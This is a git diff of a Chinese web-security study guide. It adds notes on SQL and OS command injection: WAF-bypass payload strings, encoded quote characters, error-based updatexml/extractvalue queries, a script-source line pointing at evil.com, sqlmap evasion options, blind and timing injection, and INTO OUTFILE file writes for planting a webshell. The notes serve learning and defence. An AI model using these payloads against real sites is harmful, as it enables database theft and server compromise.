@@ -1,26 +1,26 @@
 Attention: 
-1. 由于中国的中考，我将停止一段时间来编辑这个文件。当我再次有空时，我将继续把各文件夹中的文章编进readme.md中，毕竟各文件夹内的文档可视性并不高(I will be taking a break from working on this document for a while due to the senior high school entrance exams in China. When I am free again, I will continue to compile the articles in the various folders into a readme.md. After all, there is not much visibility of the documents in each folder.)
-2. 在阅读各内容之前，建议先阅读rules.md文件(It is recommended to read the rules.md file before reading the individual contents.)
-3. 我的英语水平非常差，所以本文中的英文可能会出现一些差错，如果发现比较奇怪的英语语法或内容时，建议使用翻译器翻译上方的中文，请谅解(My English is very poor, so there may be some errors in the English in this article. If you find strange English grammar or content, please understand that you are advised to use a translator to translate the Chinese above.)
-4. 本文章内的所有内容均以中文呈现。本作者现在正在学习英语，现只到达托福60分的水准，等到以后我的英语学习之路基本完成，我会继续编写英文版内容，请谅解(All content in this article is presented in Chinese. The author is currently studying English and has only reached a TOEFL score of 60. Please understand that I will continue to write English content when my English learning journey is basically complete.)
-5. 文段中存在重复的问题的地方，会只在一处地方讲解(Where there are repetitive questions in the passage, they will be explained in one place only.)
-6. 一些重要内容会用红色标注，标题会用黄色标注，但颜色不会在github界面显示，如果可以，请调至code模式观看，如果将文档下载至本地，则建议使用深色界面观看(Some important content will be marked in red, title will be marked in yellow, but the colour will not be displayed in the github interface, if possible, please turn to code mode to watch, if you are downloading a document locally, it is recommended that you use the dark interface to view it)
-7. 如果现在有需要阅读英文版的文章，请使用翻译器辅助阅读(推荐使用chatGPT进行翻译，因为翻译器不能完整且准确地表达出本文中的专业性知识，若使用chatGPT，建议给一个前情提要)(If you now have to read the English version of the article, please use a translator to assist you in reading it. (It is recommended to use chatGPT for translation, as the translator does not give a complete and accurate representation of the expertise in this article, if you use chatGPT, it is recommended to give a foreword.))
-8. 如果我的文章中存在任何问题，欢迎大家指出(If there are any problems in my article, please feel free to point them out.)
-9. 以下内容和各文件夹(文件夹不包括reprint、thematic topic and analysis、tools)中的内容一致，仅为更可观的版本存在于此(The following content corresponds to the content in each folder (folders excluding reprint, thematic topic and analysis, tools), only the more substantial version exists here.)
+> 1. 由于中国的中考，我将停止一段时间来编辑这个文件。当我再次有空时，我将继续把各文件夹中的文章编进readme.md中，毕竟各文件夹内的文档可视性并不高(I will be taking a break from working on this document for a while due to the senior high school entrance exams in China. When I am free again, I will continue to compile the articles in the various folders into a readme.md. After all, there is not much visibility of the documents in each folder.)
+> 2. 在阅读各内容之前，建议先阅读rules.md文件(It is recommended to read the rules.md file before reading the individual contents.)
+> 3. 我的英语水平非常差，所以本文中的英文可能会出现一些差错，如果发现比较奇怪的英语语法或内容时，建议使用翻译器翻译上方的中文，请谅解(My English is very poor, so there may be some errors in the English in this article. If you find strange English grammar or content, please understand that you are advised to use a translator to translate the Chinese above.)
+> 4. 本文章内的所有内容均以中文呈现。本作者现在正在学习英语，现只到达托福60分的水准，等到以后我的英语学习之路基本完成，我会继续编写英文版内容，请谅解(All content in this article is presented in Chinese. The author is currently studying English and has only reached a TOEFL score of 60. Please understand that I will continue to write English content when my English learning journey is basically complete.)
+> 5. 文段中存在重复的问题的地方，会只在一处地方讲解(Where there are repetitive questions in the passage, they will be explained in one place only.)
+> 6. 一些重要内容会用红色标注，标题会用黄色标注，但颜色不会在github界面显示，如果可以，请调至code模式观看，如果将文档下载至本地，则建议使用深色界面观看(Some important content will be marked in red, title will be marked in yellow, but the colour will not be displayed in the github interface, if possible, please turn to code mode to watch, if you are downloading a document locally, it is recommended that you use the dark interface to view it)
+> 7. 如果现在有需要阅读英文版的文章，请使用翻译器辅助阅读(推荐使用chatGPT进行翻译，因为翻译器不能完整且准确地表达出本文中的专业性知识，若使用chatGPT，建议给一个前情提要)(If you now have to read the English version of the article, please use a translator to assist you in reading it. (It is recommended to use chatGPT for translation, as the translator does not give a complete and accurate representation of the expertise in this article, if you use chatGPT, it is recommended to give a foreword.))
+> 8. 如果我的文章中存在任何问题，欢迎大家指出(If there are any problems in my article, please feel free to point them out.)
+> 9. 以下内容和各文件夹(文件夹不包括reprint、thematic topic and analysis、tools)中的内容一致，仅为更可观的版本存在于此(The following content corresponds to the content in each folder (folders excluding reprint, thematic topic and analysis, tools), only the more substantial version exists here.)
 
 csdn address:[hackjacking.blog.csdn.net](https://hackjacking.blog.csdn.net/)
 
 # Web
 
 参考资料来源于
-- CSDN
-- GitHub
-- Google
-- 维基百科
-- YouTube
-- MDN Web Docs
-- 其他小型网站与书籍
+> - CSDN
+> - GitHub
+> - Google
+> - 维基百科
+> - YouTube
+> - MDN Web Docs
+> - 其他小型网站与书籍
 
 ## <font color="yellow">0x00世界观安全</font>
 
@@ -182,7 +182,7 @@ csdn address:[hackjacking.blog.csdn.net](https://hackjacking.blog.csdn.net/)
 
 > 随着HTML5的流行，前端不再是人们眼中的小玩意，以前在C/S中实现的桌面软件的功能逐步迁移到了前端，前端的代码逻辑逐渐变得复杂起
 >
-> 以前只用于后台的MV*等架构在前端逐渐使用起来，以下列举了部分常用的MV*框架来
+> 以前只用于后台的`MV*`等架构在前端逐渐使用起来，以下列举了部分常用的`MV*`框架来
 >
 > 随着这些MV*框架的出现，网页逐渐由Web Site演变成了Web App，最终导致了复杂的单页应用（ Single Page Application）的出现
 >
@@ -365,7 +365,7 @@ SQL注入、XSS攻击的出现是Web安全史上的一个里程碑
 		- 中危：Risk = 8～11
 		- 低危：Risk = 0～7
 
-***模型只是工具，起决定性作用的是人***
+<font color="red">模型只是工具，起决定性作用的是人</font>
 
 4. 确认解决方案
 解决方案一定要有针对性，针对前三点做出安全方案
@@ -719,7 +719,7 @@ Cookie中一般加密保存了当前用户的登录凭证，如果Cookie丢失�
 
 ##### <font color="yellow">0002 强大的XSSPayload</font>
 
-<font color="yellow">a. 构造GET与POST请求</font>
+###### <font color="yellow">a. 构造GET与POST请求</font>
 
 特点(http的特点)
 > 基于tcp/ip、一种网络应用层协议、超文本传输协议HyperText Transfer Protocol
@@ -919,13 +919,13 @@ http状态码
 	
 一个网站的应用只需要接受HTTP协议中的GET或POST请求，即可完成所有操作，对于攻击者来说，仅通过JavaScript就可以让浏览器发起这两个请求，所以XSS攻击后，攻击者除了可以实施Cookie劫持外，还能够通过模拟GET、POST请求操作用户的浏览器，这在某些隔离环境中会非常有用，比如Cookie劫持失效时，或者目标用户的网络不能访问互联网等情况
 
-<font color="yellow">b. XSS钓鱼</font>
+###### <font color="yellow">b. XSS钓鱼</font>
 
 > 将XSS与钓鱼结合的思路，利用JavaScript在当前界面伪造一个登录框，当用户在登录框中输入用户名与密码后，其密码会发送到黑客的服务器上
 > 
 > 充分发挥想象力，可以使XSS攻击的威力更加巨大
 
-<font color="yellow">c. 识别用户浏览器</font>
+###### <font color="yellow">c. 识别用户浏览器</font>
 
 > 在很多时候，攻击者为了获取更大的利益，往往需要准确地手机用户的个人信息
 > 
@@ -937,7 +937,7 @@ http状态码
 > 
 > [http://www.thespanner.co.uk/2009/01/29/detecting-browsers-javascript-hacks/](http://www.thespanner.co.uk/2009/01/29/detecting-browsers-javascript-hacks/)
 
-<font color="yellow">d. 识别用户安装的软件</font>
+###### <font color="yellow">d. 识别用户安装的软件</font>
 
 > 知道了用户使用的浏览器、操作系统后，进一步可以识别用户安装的软件
 > 
@@ -947,15 +947,14 @@ http状态码
 > 
 > 浏览器的扩展与插件也能被XSS Payload扫描出来
 
-<font color="yellow">e. CSS History Hack</font>
+###### <font color="yellow">e. CSS History Hack</font>
 
 > 通过CSS，可以发现用户曾经访问过的网站
 > 
 > 这个技巧最早被Jeremiah Grossman发现，其原理是利用style的visited属性，如果用户曾经访问过某个链接，那么这个链接的颜色会变得与众不同
 
-<font color="yellow">f. 获取用户的真实IP地址</font>
+###### <font color="yellow">f. 获取用户的真实IP地址</font>
 
-> 
 > 通过XSS Payload还有办法获得一些客户端的本地IP地址
 > 
 > 很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面，网站看到的客户端IP地址是内网的出口IP地址，而并非用户的真实IP地址
@@ -966,7 +965,7 @@ http状态码
 > 
 > 可以借助以上两点结合第三方软件使用，获得用户IP地址[http://decloak.net/decloak.html](http://decloak.net/decloak.html)
 
-<font color="yellow">g. XSS攻击平台</font>
+###### <font color="yellow">g. XSS攻击平台</font>
 
 > - Attack API
 > 
@@ -988,7 +987,7 @@ http状态码
 > 
 > 这些XSS攻击平台有助于深入了解XSS的原理及危害
 
-<font color="yellow">h. XSS Worm</font>
+###### <font color="yellow">h. XSS Worm</font>
 
 > 注：一种蠕虫病毒
 > 
@@ -1004,7 +1003,7 @@ http状态码
 > 
 > 以上两个蠕虫并不是恶意的蠕虫，真正可怕的蠕虫是那些在无声无息地盗取用户的敏感信息的蠕虫，然而这些蠕虫并不会干扰用户的正常使用，非常隐蔽
 
-<font color="yellow">i. 调试JavaScript</font>
+###### <font color="yellow">i. 调试JavaScript</font>
 
 > 想写好XSS Payload，需要有很好的JavaScript功底，调试JavaScript也是必不可少的技能
 > 
@@ -1016,8 +1015,7 @@ http状态码
 > 
 > <font color="red">工具只是辅助，并不起关键作用</font>
 
-<font color="yellow">j. XSS构造技巧</font>
-
+###### <font color="yellow">j. XSS构造技巧</font>
 
 利用字符编码
 > 百度收藏：将`%c1\`组成新的Unicode字符这样`%c1`把转运符号`\`隐藏起来了，从而绕过了系统的安全检查，实施了XSS攻击
@@ -1245,7 +1243,7 @@ e.g.：用户昵称会在很多地方展示，每个界面的语境也可能各�
 
 ##### <font color="yellow">0005 处理富文本</font>
 
-> 有些时候，网站需要允许用户提交一些自定义的HTML代码，称之为富文本，在处理富文本时，还是要回到输入检查的思路上来，输入检查的主要问题是在检查时还不知道变量的输出语境，但用户提交的富文本数据，其语义是完整的HTML代码，在输出时也不会`\n`，拼凑到某个标签的属性中，因此可以特殊情况特殊处理，在**正确地防御XSS**中，列出了所有在HTML中可能执行脚本的地方，而一个优秀的XSS Filter，也应该能够找出HTML代码中所有可能执行脚本的地方，HTML是一种结构化的语言，比较好分析，通过htmlparser可以解析出HTML代码的标签、标签属性和事件，在过滤富文本时，事件应该被严格禁止，因为富文本的展示需求里不应该包括事件这种动态效果，而一些危险的标签，如`<iframe>`、`<scroipt>`、`<base>`、`<from>`等，也是应该严格禁止的对象，在标签的选择上，<font color="red">应该使用白名单，避免使用黑名单</font>
+> 有些时候，网站需要允许用户提交一些自定义的HTML代码，称之为富文本，在处理富文本时，还是要回到输入检查的思路上来，输入检查的主要问题是在检查时还不知道变量的输出语境，但用户提交的富文本数据，其语义是完整的HTML代码，在输出时也不会`\n`，拼凑到某个标签的属性中，因此可以特殊情况特殊处理，在防御XSS中，列出了所有在HTML中可能执行脚本的地方，而一个优秀的XSS Filter，也应该能够找出HTML代码中所有可能执行脚本的地方，HTML是一种结构化的语言，比较好分析，通过htmlparser可以解析出HTML代码的标签、标签属性和事件，在过滤富文本时，事件应该被严格禁止，因为富文本的展示需求里不应该包括事件这种动态效果，而一些危险的标签，如`<iframe>`、`<scroipt>`、`<base>`、`<from>`等，也是应该严格禁止的对象，在标签的选择上，<font color="red">应该使用白名单，避免使用黑名单</font>
 > 
 > e.g.：`<a>`、`<img>`、`<div>`等比较安全的标签
 > 
@@ -3525,341 +3523,472 @@ Python反弹shell
 
 ## 0x02 服务器端应用安全
 
+### <font color="yellow">01 注入攻击</font>
 
+#### <font color="yellow">001 注释符</font>
 
+- `//`
+- `--%20`
+- `/**/`
+- `#`
+- `--+`
+- `-- -`
+- `%00`
+- `;`
 
+#### <font color="yellow">002 大小写绕过</font>
 
+用于屏蔽一些对大小写敏感的黑名单匹配`?id=1 UnIon SeLeCt user()#`
 
+#### <font color="yellow">003 双写绕过</font>
 
+waf将关键字替换为空，没有回归`?id=1 uniunionon seselectlect user()#`
 
+#### <font color="yellow">004 编码绕过</font>
 
+利用urlencode，ascii(char，hex，unicode等编程绕过)
 
+`'` :
 
+```
+%u0027 %u02b9 %u02bc 
+%u02c8 %u2032 
+%uff07 %c0%27 
+%c0%a7 %e0%80 %a7empty 
+```
 
+`:`:
 
+```
+%u0020 %cuff00 
+%c0%20 e0%80%a0
+```
 
+`(`: 
 
+```
+%u0028 %uff08 
+%c0%28 %c0%a8 
+%e0%80%a8 
+```
 
+`)`: 
 
+```
+%u0029 %uff09 
+%c0%29 %c0%a9 
+%e0%80%a9
+```
 
+#### <font color="yellow">005 绕过空格</font>
 
+用Tab代替空格`%20 %09 %0a %0b %0c %0d %a0 /**/`
 
+#### <font color="yellow">006 like绕过</font>
 
+`?id=1' or 1 like 1#`，可以绕过对`=`、`>`等过滤
 
+#### <font color="yellow">007 in绕过</font>
 
+`or '1' IN('1234')#`可以替代`=`
 
 
+#### <font color="yellow">008 等价函数或变量</font>
 
+`hex()`、`bin()` ==> `ascii()`
 
+`sleep()` ==> `benchmark()`
 
+`concat_ws()` ==> `group_concat()`
 
+`mid()`、`substr()` ==> `substring()`
 
+`@@user` ==> `user()`
 
+`@@datadir` ==> `datadir()`
 
+#### <font color="yellow">009 生僻函数</font>
 
+MySQL/PostgreSQL支持XML函数：`Select UpdateXML(‘<script x=_></script> ’,’/script/@x/’,’src=//evil.com’);`
 
+`?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))`
 
+`SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql`
 
+`?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));`
 
+`and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))`
 
+`and extractvalue(1, concat(0x5c, (select user()),0x5c))`
 
+#### <font color="yellow">010 反引号绕过</font>
 
+``select `version()` ``，可以用来过空格和正则，特殊情况下还可以将其做注释符用
 
+#### <font color="yellow">011 宽字符绕过</font>
 
+宽字节绕过主要是sql数据库编码问题造成的，在过滤单引号时，可以尝试用
 
+`%bf%27 %df%27 %aa%27`
 
+#### <font color="yellow">012 \n绕过</font>
 
+\n相当于NULL字符
 
+`select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0`
 
+`select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0`
 
+`select * from users where id=\nunion select 1,2,3,4,5,6,7,8,9,0`
 
+#### <font color="yellow">013 特殊字符绕过</font>
 
+##### <font color="yellow">0001 greatest()绕过<></font>
 
+`select greatest(ascii(mid(user(),1,1)),150)=150;`
 
+##### <font color="yellow">0002 mid()等绕过，</font>
 
+`mid(user() from 1 for 1)`
 
+`substr(user() from 1 for 1)`
 
+`select ascii(substr(user() from 1 for 1)) < 150;`
 
+##### <font color="yellow">0003 php中创建等waf绕过、</font>
 
+php过滤直接用`preg_match('/('.waf.')/i',$id)`
 
+###### <font color="yellow">a. 过滤and or</font>
 
+> `waf = 'and|or'`
+> 
+> 过滤代码 `1 or 1=1`   `1 and 1=1`
+> 
+> 绕过方式 `1 || 1=1`   `1 && 1=1`
 
+###### </font color="yellow">b. 过滤union</font>
 
+> `waf = 'and|or|union'`
+> 
+> 过滤代码 `union select user,password from users`
+> 
+> 绕过方式 `1 && (select user from users where userid=1)='admin'`
 
+###### </font color="yellow">c. 过滤where</font>
 
+> `waf = 'and|or|union|where'`
+> 
+> 过滤代码 `1 && (select user from users where user_id = 1) = 'admin'`
+> 
+> 绕过方式 `1 && (select user from users limit 1) = 'admin'`
 
+###### </font color="yellow">d. 过滤limit</font>
 
+> `waf = 'and|or|union|where|limit'`
+> 
+> 过滤代码 `1 && (select user from users limit 1) = 'admin'`
+> 
+> 绕过方式 `1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin`
 
+###### </font color="yellow">e. 过滤group by</font>
 
+> `waf = 'and|or|union|where|limit|group by'`
+> 
+> 过滤代码 `1 && (select user from users group by user_id having user_id = 1) = 'admin'`
+> 
+> 绕过方式 `1 && (select substr(group_concat(user_id),1,1) user from users ) = 1`
 
+###### </font color="yellow">f. 过滤select</font>
 
+> `waf = 'and|or|union|where|limit|group by|select'`
+> 
+> 过滤代码 `1 && (select substr(group_concat(user_id),1,1) user from users ) = 1`
+> 
+> 绕过方式 `1 && substr(user,1,1) = 'a'`
 
+###### </font color="yellow">g. 过滤'</font>
 
+> `waf = 'and|or|union|where|limit|group by|select|\''`
+> 
+> 过滤代码 `1 && substr(user,1,1) = 'a'`
+> 
+> 绕过方式 `1 && user_id is not null    1 && substr(user,1,1) = 0x61    1 && substr(user,1,1) = unhex(61)`
 
+###### </font color="yellow">h. 过滤hex</font>
 
+> `waf = 'and|or|union|where|limit|group by|select|\'|hex'`
+> 
+> 过滤代码 `1 && substr(user,1,1) = unhex(61)`
+> 
+> 绕过方式 `1 && substr(user,1,1) = lower(conv(11,10,16)) `
 
+###### </font color="yellow">i. 过滤substr</font>
 
+> `waf = 'and|or|union|where|limit|group by|select|\'|hex|substr'`
+> 
+> 过滤代码 `1 && substr(user,1,1) = lower(conv(11,10,16)) `
+> 
+> 绕过方式 `1 && lpad(user(),1,1) in 'r'`
 
+#### <font color="yellow">014 SQL注入简介</font>
 
+SQL注入攻击是通过将恶意的SQL查询或添加语句插入到应用的输入参数中，再在后台SQL服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一
 
+#### <font color="yellow">015 Web程序三层架构</font>
 
+三层架构(3-tier architecture)通常意义上就是将整个业务应用划分为一下三个层面
 
+- 界面层(User Interface layer)
+- 业务逻辑层(Business Logic Layer)
+- 数据访问层(Data access layer)
 
+区分层次的目的即为了高内聚低耦合的思想
 
+在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构被应用于众多类型的软件开发
 
+由数据库驱动的Web应用程序依从三层架构的思想也分为了以下三层
 
+- 表示层
+- 业务逻辑层(又称领域层)
+- 数据访问层(又称存储层)
 
+用户访问实验楼主页进行了如下过程
 
+- 在Web浏览器中输入www.shiyanlou.com连接到实验楼服务器
+- 业务逻辑层的Web服务器从本地存储中加载index.php脚本并解析
+- 脚本连接位于数据访问层的DBMS(数据库管理系统)，并执行SQL语句
+- 数据访问层的数据库管理系统返回SQL语句执行结果给Web服务器
+- 业务逻辑层的Web服务器将Web页面封装成HTML格式发送给表示层的Web浏览器
+- 表示层的Web浏览器解析HTML文件，将内容展示给用户
 
+在三层架构中，所有通信都必须要经过中间层，简单地说，三层架构是一种线性关系
 
+#### <font color="yellow">016 SQL注入漏洞详解</font>
 
+SQL注入产生原因及威胁：Web服务器会向数据访问层发起SQL查询请求，如果权限验证通过就会执行SQL语句，这种网站内部直接发送的Sql请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险
 
+SQL注入带来的威胁主要有以下几点
 
+- 猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息
+- 绕过认证，列如绕过验证登录网站后台
+- 注入可以借助数据库的存储过程进行提权等操作
 
+#### <font color="yellow">017 判断SQL注入点</font>
 
+通常情况下，可能存在SQL注入漏洞的URL是类似这种形式`http://xxx.xxx.xxx/abcd.php?id=XX`
 
+对SQL注入的判断，主要有两个方面
 
+- 判断该带参数的URL是否存在SQL注入
+- 如果存在SQL注入，那么属于哪种SQL注入
 
+可能存在SQL注入攻击的ASP/PHP/JSP动态网页中，一个动态网页中可能只有一个参数，有时可能有多个参数
 
+有时是整型参数，有时是字符串型参数，不能一概而论
 
+总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入
 
+如果程序员没有足够的安全意识，没有进行必要的字符过滤，存在SQL注入的可能性就非常大
 
+判断是否存在SQL注入漏洞
 
+> ```
+> http://xxx/abc.php?id=1'
+> ```
+> 
+> 如果页面返回错误，则存在SQL注入
+> 
+> 原因是无论字符型还是整型都会因为单引号个数不匹配而报错
+> 
+> 如果未报错，不代表不存在SQL注入，因为有可能页面对单引号做了过滤，这时可以使用判断语句进行注入
 
+判断SQL注入漏洞的类型
 
+通常SQL注入漏洞分为2种类型
 
+- 数字型
+- 字符型
 
+其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分常用的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型
 
+OS注入
 
+调用OS命令引起的安全隐患：Web开发所使用的编程语言中，大多数都能通过Shell执行OS(操作系统)命令，通过Shell执行OS命令时，或者开发中用到的某个方法其内部利用了Shell时，就有可能出现OS命令被任意执行的情况，这种现象被称为OS命令注入
 
+安全隐患产生的原因：内部调用OS命令的函数以及系统调用(System Call)中，多数都通过Shell来启动命令，Shell是用来操作OS的命令行界面，如Windows中的cmd.exe、Unix系的OS中的sh、bash、csh等，通过Shell来启动命令，能够使用管道命令(Pipe)或重定向等功能的使用变的更加便捷，`system(“echo hell > a.txt”);`PHP中调用system函数，实际启动的命令，通过sh调用命令，然而，Shell提供的便利功能却会称为OS命令注入漏洞产生的根源，Shell提供了一次启动多个命令的语法，因此外界就可以在参数中做手脚，使得在原来的命令的基础上又有其他的命令被启动
 
+在Shell中执行多条命令
 
+shell提供了通过制定1行来启动多个程序的方法，而OS命令注入攻击就恶意利用了Shell能够启动多个程序的特性
 
+```shell
+$ echo aaa ； echo bbb#利用分号；连续执行多条命令
+aaa
+bbb
+$ echo aaa & echo bbb#在后台和前台执行多条命令
+aaa
+bbb
+[1] + Done echo aaa
+$echo aaa && echo bbb#利用&&,如果第1个命令执行成功就执行第2个命令
+aaa
+bbb
+$ cat aaa || echo bbb#利用||，如果第1个命令执行失败就执行第2个命令
+cat: aaa:NO such file or directory
+bbb
+$wc `ls`#将倒引号中的字符作为命令执行
+$ echo aaa | wc #利用管道符，将第一个命令的输出作为第二个命令的输入
+```
 
+Shell中的元字符：Windows的cmd.exe中能够使用&来连续执行多条命令，另外`|`(管道功能)、`&&`或`||`的用法也和Unix、Linux一样，Shell中拥有特殊意义的字符(如`；`、`|`等)被称为shell的元字符，把元字符当做普通字符使用时需要对其进行转义，而如果在指定OS命令参数的字符串中混入了SHell的元字符，就会使得攻击者添加的OS命令被执行，这也就是OS命令注入漏洞产生的原因
 
+安全隐患的产生的原因总结：Web应用的开发语言中，有些函数的内部实现利用了Shell，如果开发者使用了这些内部调用Shell的函数，就可能会使得意料之外的OS命令被执行，这种状态被称为OS命令注入漏洞，OS命令注入漏洞的形成需要同时满足以下三个条件
 
+- 使用了内部调用Shell的函数(system、open等)
+- 将倍加传入的参数传递给内部调用的shell的函数
+- 参数中shell的元字符没有被转义
 
+解决对策：为了防范OS命令注入漏洞，有以下三种推荐方式
 
+- 选择不调用OS命令的实现方法：不调用利用shell的功能，既能杜绝了OS命令注入漏洞混入的可能性，又消除了调用OS命令的而系统开销，能够从多方面提高应用的性能
+- 不将外界输入的字符串传递给命令行参数
+- 使用安全的函数对传递给OS命令参数进行转义
 
+#### <font color="yellow">018 SQL注入</font>
 
+注入攻击是Web安全领域中一种最为常见的攻击方式，XSS的本质相当于针对HTML的注入攻击，以及安全世界观中的数据与代码分离原则就是为了解决注入攻击而产生的
 
+注入攻击的条件
 
+- 用户能够控制输入
+- 原本程序要执行的代码中拼接了用户输入的数据
 
+SQL注入第一次出现在黑客rfp发布的一篇题为NT Web Technology Vulnerabilities的文章[http://www.phrack.org/issues.html?issue=54&id=8#article](http://www.phrack.org/issues.html?issue=54&id=8#article)
 
+SQL注入的条件：用户能够控制输入(变量ShipCity)，原本程序要执行的代码中拼接了用户输入的数据，<font color="red">这个拼接非常重要，这个拼接导致了代码的注入</font>
 
+在SQL注入的过程，如果网站的Web服务器开启了错误回显，则会为攻击者提供极大的便利
 
+e.g.
 
+> 攻击者在参数中输入`'`引起执行查询语句的语法错误，服务器直接返回了错误信息
+> 
+> 一句错误信息，可以知道服务器用什么作为数据库，查询语句的伪代码极有可能是其对应的语句
+> 
+> 错误回显披露了敏感信息，对于攻击者来说，构造SQL注入的语句就可以更加得心应手了
 
+盲注(Blibd Injection)
 
+布尔盲注
 
+简介及场景
 
+> 盲注的本质就是，在页面无法给我提供回显的时候的一中继续注入的手段
+> 
+> 在我们输入and 1或者and 0，浏览器返回给我们两个不同的页面，而我们就可以根据返回的页面来判断正确的数据信息
 
+相关函数
 
+`length()`函数
 
+> `length()`函数的作用是返回字符串str的长度，以字节为单位，一个多字节字符算作多字节，这意味着，对于包含四个两字节字符的字符串，`length()`返回8，而`char_length()`返回4
 
+`substr()`函数
 
+> `substr()`函数从特定位置开始的字符串返回一个给定长度的子字符串
+> 
+> `substr()`函数有三个参数，用法为：`substr(str,pos,len)`
+> 
+> str参数代表待截取的字符串
+> 
+> pos参数代表从什么位置开始截取
+> 
+> len参数表示字符串截取的长度
+> 
+> 其他与`substr()`函数作用相似的函数有`mid()`和`substring()`函数，其用法和`substr()`函数一致
 
+`ascii()`函数
 
+> `ascii()`函数可以输出某个字符的ascii码值，ascii码共127个，此处注意ascii函数处理单个字符，如果是字符串则会处理第一个字符
 
+注入实现
 
+布尔盲注用到的函数`length()`、`substr()`和`ascii()`函数
 
+这里直接用数据库阐述原理，在实际中，如下面的例子注入点为id=1，我们已经无法使用union来直接查询，此处我们需要用到关键字and，我们知道只有and前后的条件都为真的时候，数据库才会输出结果
 
+- 判断数据库名的长度
+- 猜解数据库名
+- 猜解表名
+- 猜解字段
+- 猜解数据
 
+自动化工具
 
+sqlmap注入工具
 
+> 可以直接使用自动化工具进行注入，可以直接简单点，语句大概是`sqlmap -u http://xxx.xxx.xx.xx/xx.php?id=xx`
+> 
+> random随机给一个请求头，delay多少秒尝试一次，也可以使用--safe-freq(后面跟一个数字，代表每隔几次访问一次正常链接)和thread(线程)，technique可选择注入类型，dbms选择数据库，如果有防火墙可以跟上--tamper
+> 
+> `sqlmap -u http://xxx.xxx.xx.xx/xx.php?id=xx --random-agent --delay 3 --thread=3 --technique=B --dbms=mysql`
 
+Burp中的爆破模块
 
+> 直接抓取输入，`and ascii(substr(database(),1,1))=1`的数据包，放到爆破模块
 
+但在很多时候，Web服务器关闭了错误回显，这时还有一种办法可能成功完成SQL注入
 
+攻击者为了应对这种情况，研究出了Blibd Injection(盲注)这一技巧
 
+盲注就是在服务器没有错误回显是完成注入攻击，服务器没有错误回显，对于攻击者来说缺少了非常重要但调试信息，所以攻击者必须找到一个方法来验证注入但SQL语句是否得到执行
 
+最常见的盲注验证方法是构造简单条件语句，根据页面是否发生变化判断SQL语句是否得到执行，对于Web应用来说，也不会返回给用户，攻击者看到的页面结果将为空或者跳出错页面
 
+当攻击者构造条件`and 1 = 1`时，如果页面返回正常，则说明SQL语句的`and`成功执行了那么判断id参数就是SQL注入的漏洞
 
+盲注原理：攻击者通过简单的条件判断，再对比页面返回结果的差异，就可以判断SQL漏洞是否存在
 
+Timing Attack
 
+黑客TinKode在著名的安全邮件列表Full Disclosure上公布了一些他入侵mysql.com搜获得的细节
 
+<font color="red">利用BENCHMARK()函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长，通过时间长短的变化，这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack</font>
 
+#### <font color="yellow">019 数据库攻击技巧</font>
 
+常见的攻击技巧
 
+SQL注入是基于数据库的一种攻击，不同的数据库有着不同的功能、不同的算法和函数，因此，针对不同数据库，SQL注入的技巧也有所不同
 
+SQL注入漏洞，仅仅可以猜解出数据库的对应版本
 
+如下面这段Payload，如果MySQL版本是4，就会返回TRUE
 
+```
+Http://www.site.com/news.php?id=5 and substring(@@version,1,1)=4
+```
 
+如下Payload，则是利用union select来分别确认表名admin是否存在，列名passwd是否存在
 
+```
+id=5 union all select 1,2,3 from admin
+id=5 union all select 1,2,passwd from admin
+```
 
+这个过程非常繁琐，所以非常有必要使用一个自动化工具来帮助完成整个过程[http://sqlmap.sourceforge.net](http://sqlmap.sourceforge.net)
 
+在注入攻击的过程中，常常会用到一些读写文件的技巧
 
+如MySQL中，就可以通过`LOAD_FILE()`读取系统文件，并通过`INTO DUMPFILE`写入本地文件，当然这要求当前数据库用户有读写系统相应文件或目录的权限
 
+除了用`INTO DUMPFILE`外，还能用`INTO OUTFILE`
 
+区别
 
+- `DUMPFILE`适用于汇编语言，它会将目标文件写入同一行内
+- `OUTFILE`适用于纯文本文件，更适合阅读(相对于`DUMPFILE`)
 
+写入文件的技巧，经常被用于导出一个Webshel，为攻击者的进一步攻击做铺垫
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+因此在设计数据库安全方案时，可以禁用普通数据库用户具备操作文件的权限
